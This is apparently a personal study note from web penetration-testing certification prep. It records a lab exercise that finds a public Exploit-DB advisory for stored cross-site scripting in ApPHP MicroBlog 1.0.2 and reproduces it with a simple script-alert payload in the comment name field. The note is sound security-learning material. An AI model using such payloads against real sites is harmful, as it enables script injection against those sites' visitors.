2025-06-23 17:45

Status:

Tags: [[eWPT]] [[XSS Attacks]]
###### Prerequisites: 
# Stored XSS ApPHP Lab

```bash
──(aboshe㉿kali)-[~]
└─$ searchsploit apphp
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilit | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Execut | php/webapps/33070.py
ApPHP MicroBlog 1.0.2 - Cross-Site Request Fo | php/webapps/40506.html
ApPHP MicroBlog 1.0.2 - Persistent Cross-Site | php/webapps/40505.txt
ApPHP MicroCMS 3.9.5 - Cross-Site Request For | php/webapps/40517.html
ApPHP MicroCMS 3.9.5 - Persistent Cross-Site  | php/webapps/40516.txt
---------------------------------------------- ---------------------------------

```
then copied the file exploit

```bash
──(aboshe㉿kali)-[~]
└─$ cd Desktop                                              
                                                                                
┌──(aboshe㉿kali)-[~/Desktop]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/40505.txt .
                                                                                
┌──(aboshe㉿kali)-[~/Desktop]
└─$ cat 40505.txt                                                 
# Exploit Title :              ApPHP MicroBlog 1.0.2  - Stored Cross
Site Scripting
# Author :                      Besim
# Google Dork :
# Date :                         12/10/2016
# Type :                         webapps
# Platform :                    PHP
# Vendor Homepage :   -
# Software link :            http://www.scriptdungeon.com/jump.php?ScriptID=9162

Description :

Vulnerable link : http://site_name/path/index.php?page=posts&post_id=

Stored XSS Payload ( Comments ): *

# Vulnerable URL :
http://site_name/path/index.php?page=posts&post_id= - Post comment section
# Vuln. Parameter : comment_user_name

############  POST DATA ############

task=publish_comment&article_id=69&user_id=&comment_user_name=<script>alert(7);</script>&comment_user_email=besimweptest@yopmail.com&comment_text=Besim&captcha_code=DKF8&btnSubmitPC=Publish
your comment

############ ######################                                                                                
┌──(aboshe㉿kali)-[~/Desktop]
└─$ 

```

and i put the payload

```JavaScript
<script>alert(8);</script>
```
it worked 